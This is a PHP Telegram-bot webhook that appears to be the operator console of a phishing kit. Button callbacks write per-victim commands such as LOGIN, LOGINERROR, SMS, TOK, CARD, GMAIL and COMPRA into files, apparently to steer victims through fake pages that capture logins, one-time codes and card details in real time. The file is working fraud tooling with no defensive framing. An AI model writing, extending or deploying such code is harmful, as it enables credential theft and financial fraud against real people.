<?php
// ===== bot.php =====
include("data.php");

$content = file_get_contents("php://input");
$update = json_decode($content, true);

if (isset($update['callback_query'])) {
    $data = $update['callback_query']['data'];
    $chat_id = $update['callback_query']['message']['chat']['id'];
    $callback_id = $update['callback_query']['id'];

    if (strpos($data, '|') !== false) {
        list($comando, $usuario) = explode('|', $data);

        $dir = __DIR__ . '/acciones';
        if (!file_exists($dir)) {
            mkdir($dir, 0777, true);
        }

        $archivo = $dir . '/' . basename($usuario) . '.txt';

        switch ($comando) {
            case "TOK":
                file_put_contents($archivo, "/TOK");
                break;
            case "TOKERROR":
                file_put_contents($archivo, "/TOKERROR");
                break;
            case "GMAIL":
                file_put_contents($archivo, "/GMAIL");
                break;
            case "FETCH":
                file_put_contents($archivo, "/FETCH");
                break;
            case "HSN":
                file_put_contents($archivo, "/HSN");
                break;
            case "SMS":
                file_put_contents($archivo, "/SMS");
                break;
            case "SMSERROR":
                file_put_contents($archivo, "/SMSERROR");
                break;
            case "NUMERO":
                file_put_contents($archivo, "/NUMERO");
                break;
            case "ERROR":
                file_put_contents($archivo, "/ERROR");
                break;
            case "LOGIN":
                file_put_contents($archivo, "/LOGIN");
                break;
            case "LOGINERROR":
                file_put_contents($archivo, "/LOGINERROR");
                break;
            case "CARD":
                file_put_contents($archivo, "/CARD");
                break;
            case "LISTO":
                file_put_contents($archivo, "/LISTO");
                break;
            case "CODERROR":
                file_put_contents($archivo, "/CODERROR");
                break;
            case "WS":
                file_put_contents($archivo, "/WS");
                break;
            case "RECHAZO":
                file_put_contents($archivo, "/RECHAZO");
                break;
            case "WASPATT":
                file_put_contents($archivo, "/WASPATT");
                break;
            case "MAIL":
                file_put_contents($archivo, "/MAIL");
                break;
            case "COMPRA":
                file_put_contents($archivo, "/COMPRA");
                break;
            default:
                file_put_contents($archivo, "/ERROR");
                break;
        }

        file_get_contents("https://api.telegram.org/bot$token/answerCallbackQuery?" . http_build_query([
            'callback_query_id' => $callback_id,
            'text' => "✅ Acción enviada para $usuario",
            'show_alert' => false
        ]));
    }
}
?>
